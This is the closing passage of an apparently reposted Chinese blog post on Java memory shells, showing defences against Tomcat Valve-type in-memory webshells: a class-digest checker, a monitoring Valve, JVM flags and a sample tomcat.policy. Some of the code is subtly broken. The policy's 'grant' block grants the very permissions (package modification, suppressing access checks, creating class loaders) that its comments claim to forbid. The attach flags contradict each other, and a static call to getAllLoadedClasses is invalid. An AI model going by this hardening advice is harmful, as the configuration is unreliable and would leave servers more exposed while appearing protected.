</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;org.apache.catalina.core.StandardContextValve&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;e5f6g7h8...&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">verify</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">Instrumentation</span><span class="p">.</span><span class="na">getAllLoadedClasses</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">digest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">calculateClassDigest</span><span class="p">(</span><span class="n">clazz</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">expected</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">KNOWN_DIGESTS</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">clazz</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">expected</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">expected</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">digest</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">SecurityLogger</span><span class="p">.</span><span class="na">alert</span><span class="p">(</span><span class="s">&#34;Class tampered: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">calculateClassDigest</span><span class="p">(</span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytecode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getClassBytes</span><span class="p">(</span><span class="n">clazz</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">DigestUtils</span><span class="p">.</span><span class="na">sha256Hex</span><span class="p">(</span><span class="n">bytecode</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;error&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><strong>2. 运行时行为监控</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
</span><span class="lnt" id="20"><a class="lnlinks" href="#20">20</a>
</span><span class="lnt" id="21"><a class="lnlinks" href="#21">21</a>
</span><span class="lnt" id="22"><a class="lnlinks" href="#22">22</a>
</span><span class="lnt" id="23"><a class="lnlinks" href="#23">23</a>
</span><span class="lnt" id="24"><a class="lnlinks" href="#24">24</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">PipelineMonitorValve</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">ValveBase</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Valve</span><span class="w"> </span><span class="n">original</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">AtomicInteger</span><span class="w"> </span><span class="n">requestCount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AtomicInteger</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">PipelineMonitorValve</span><span class="p">(</span><span class="n">Valve</span><span class="w"> </span><span class="n">original</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">original</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">original</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">invoke</span><span class="p">(</span><span class="n">Request</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">Response</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">long</span><span class="w"> </span><span class="n">start</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">nanoTime</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">original</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">long</span><span class="w"> </span><span class="n">duration</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">nanoTime</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">start</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 异常检测逻辑</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">duration</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">TimeUnit</span><span class="p">.</span><span class="na">MILLISECONDS</span><span class="p">.</span><span class="na">toNanos</span><span class="p">(</span><span class="n">500</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">SecurityLogger</span><span class="p">.</span><span class="na">logLongInvocation</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">duration</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">requestCount</span><span class="p">.</span><span class="na">incrementAndGet</span><span class="p">()</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="n">1000</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">SecurityLogger</span><span class="p">.</span><span class="na">snapshotPipelineState</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><strong>3. JVM层防护</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4">4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5">5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6">6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7">7</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 启用JVM安全策略
</span></span><span class="line"><span class="cl">-Djava.security.manager 
</span></span><span class="line"><span class="cl">-Djava.security.policy==tomcat.policy
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 禁止非法Attach
</span></span><span class="line"><span class="cl">-Djdk.attach.allowAttachSelf=false
</span></span><span class="line"><span class="cl">-Djdk.attach.allowAttachSelf=true:com.trusted.app</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><strong>tomcat.policy示例：</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-zed" data-lang="zed"><span class="line"><span class="cl"><span class="n">grant</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 禁止关键包修改
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">permission</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">RuntimePermission</span><span class="w"> </span><span class="err">&#34;</span><span class="n">modifyPackage</span><span class="p">.</span><span class="n">org</span><span class="p">.</span><span class="n">apache</span><span class="p">.</span><span class="n">catalina</span><span class="p">.</span><span class="n">core</span><span class="err">&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 限制反射访问
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">permission</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">reflect</span><span class="p">.</span><span class="n">ReflectPermission</span><span class="w"> </span><span class="err">&#34;</span><span class="n">suppressAccessChecks</span><span class="err">&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 禁止创建类加载器
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">permission</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">RuntimePermission</span><span class="w"> </span><span class="err">&#34;</span><span class="n">createClassLoader</span><span class="err">&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/xvsf/tags/java%E5%AE%89%E5%85%A8/">Java安全</a></li>
      <li><a href="http://localhost:1313/xvsf/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a></li>
      <li><a href="http://localhost:1313/xvsf/tags/%E8%BD%AC%E8%BD%BD/">转载</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/xvsf/posts/switch-jdk-versions-in-windows/">
    <span class="title">« Prev</span>
    <br>
    <span>Switch JDK versions in Windows</span>
  </a>
  <a class="next" href="http://localhost:1313/xvsf/posts/java-%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E5%9B%9B%E7%AF%87---agent-%E5%86%85%E5%AD%98%E9%A9%AC/">
    <span class="title">Next »</span>
    <br>
    <span>Java 内存马第四篇 - Agent 内存马</span>
  </a>
</nav>

  </footer><div class="giscus"></div>
<script src="https://giscus.app/client.js"
        data-repo="XVSHIFU/xvsf"
        data-repo-id="R_kgDOQ6WxXQ"
        data-category="Announcements"
        data-category-id="DIC_kwDOQ6WxXc4C1A4B"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="light_protanopia"
        data-lang="zh-CN"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2026 <a href="http://localhost:1313/xvsf/">xvsf</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>


<script>
document.addEventListener('DOMContentLoaded', function() {
    
    document.querySelectorAll('.code-header').forEach(header => {
        header.addEventListener('click', (e) => {
            if (e.target.closest('.copy-btn')) return;
            const container = header.parentElement;
            const isExpanded = container.getAttribute('data-expanded') === 'true';
            container.setAttribute('data-expanded', !isExpanded);
        });
    });

    
    document.querySelectorAll('.copy-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const container = btn.closest('.code-block-container');
            const code = container.querySelector('code').innerText;
            navigator.clipboard.writeText(code).then(() => {
                const originalHTML = btn.innerHTML;
                btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#50fa7b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
                setTimeout(() => { btn.innerHTML = originalHTML; }, 2000);
            }).catch(err => { console.error('Failed to copy!', err); });
        });
    });
});
</script>




<script>
(function() {
    
    const STOP_TIME = 15000; 
    const NUMBER_OF_LEAVES = 30; 
    
    
    if (window.innerWidth < 768) return;

    var container = document.createElement('div');
    container.id = "sakura-container";
    container.style.position = 'fixed';
    container.style.top = '0';
    container.style.left = '0';
    container.style.width = '100%';
    container.style.height = '100%';
    container.style.pointerEvents = 'none'; 
    container.style.zIndex = '9999';
    document.body.appendChild(container);

    function createLeaf() {
        var leaf = document.createElement('div');
        
        leaf.style.position = 'absolute';
        leaf.style.width = (Math.random() * 10 + 10) + 'px'; 
        leaf.style.height = (Math.random() * 5 + 5) + 'px';
        leaf.style.background = 'linear-gradient(to bottom right, #ffc0cb, #ffb6c1)';
        leaf.style.borderRadius = '10px 0'; 
        leaf.style.opacity = Math.random() * 0.5 + 0.3;
        leaf.style.top = '-20px';
        leaf.style.left = Math.random() * 100 + '%';
        
        
        var duration = Math.random() * 5 + 5 + 's'; 
        var delay = Math.random() * 5 + 's';
        
        leaf.style.transition = `top ${duration} linear, transform ${duration} ease-in-out, opacity ${duration}`;
        container.appendChild(leaf);

        
        setTimeout(function() {
            leaf.style.top = '110%'; 
            leaf.style.transform = `rotate(${Math.random() * 360}deg) translateX(${Math.random() * 100 - 50}px)`;
            leaf.style.opacity = '0';
        }, 100);

        
        setTimeout(function() {
            leaf.remove();
        }, parseFloat(duration) * 1000 + 1000);
    }

    
    var interval = setInterval(function() {
        if (document.getElementById('sakura-container')) {
            createLeaf();
        }
    }, 400); 

    
    setTimeout(function() {
        clearInterval(interval); 
        
        
        setTimeout(function() {
            if(container) container.remove();
            console.log("樱花已落尽。");
        }, 10000); 
        
    }, STOP_TIME);

})();
</script>

<script>
    let menu = document.getElementById('menu');
    if (menu) {
        
        const scrollPosition = localStorage.getItem("menu-scroll-position");
        if (scrollPosition) {
            menu.scrollLeft = parseInt(scrollPosition, 10);
        }
        
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        const html = document.querySelector("html");
        if (html.dataset.theme === "dark") {
            html.dataset.theme = 'light';
            localStorage.setItem("pref-theme", 'light');
        } else {
            html.dataset.theme = 'dark';
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
